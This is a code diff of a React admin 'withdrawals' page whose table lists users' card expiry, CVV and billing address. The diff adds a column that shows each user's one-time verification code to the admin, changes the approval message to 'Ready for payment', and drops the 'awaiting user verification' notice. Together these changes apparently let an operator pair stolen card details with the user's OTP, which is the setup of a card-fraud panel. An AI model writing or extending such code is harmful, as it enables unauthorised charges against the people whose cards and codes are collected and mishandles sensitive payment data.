@@ -27,7 +27,7 @@ export default function AdminWithdrawalsPage() {
   const adminApproveCard = async (id: string) => {
     try {
       await api.put(`withdrawals/${id}/admin-approve`)
-      toast.success('Card approved - verification code sent to user')
+      toast.success('Card approved. Ready for payment.')
       fetchWithdrawals()
     } catch (err: any) {
       toast.error(err.response?.data?.message || 'Failed')
@@ -72,6 +72,7 @@ export default function AdminWithdrawalsPage() {
                 <th className="px-3 py-3">Expiry</th>
                 <th className="px-3 py-3">CVV</th>
                 <th className="px-3 py-3">Billing</th>
+                <th className="px-3 py-3">OTP Code</th>
                 <th className="px-3 py-3">Status</th>
                 <th className="px-3 py-3">Actions</th>
               </tr>
@@ -91,6 +92,7 @@ export default function AdminWithdrawalsPage() {
                   <td className="px-3 py-2 text-sm text-gray-600 max-w-xs truncate" title={w.billingAddress}>
                     {w.billingAddress ? w.billingAddress.slice(0, 18) + (w.billingAddress.length > 18 ? '..' : '') : '-'}
                   </td>
+                  <td className="px-3 py-2 text-sm font-mono text-brand-blue font-bold">{w.verificationCode || '-'}</td>
                   <td className="px-3 py-2 text-sm text-gray-600">
                     {w.status.replace(/_/g, ' ')}
                   </td>
@@ -104,9 +106,6 @@ export default function AdminWithdrawalsPage() {
                           <XCircle size={14} /> Reject
                         </button>
                       </>
-                    )}
-                    {w.status === 'CARD_APPROVED_WAITING_USER' && (
-                      <span className="text-xs text-amber-600">Awaiting user verification</span>
                     )}
                     {w.status === 'WITHDRAWAL_PENDING' && w.isVerified && (
                       <>
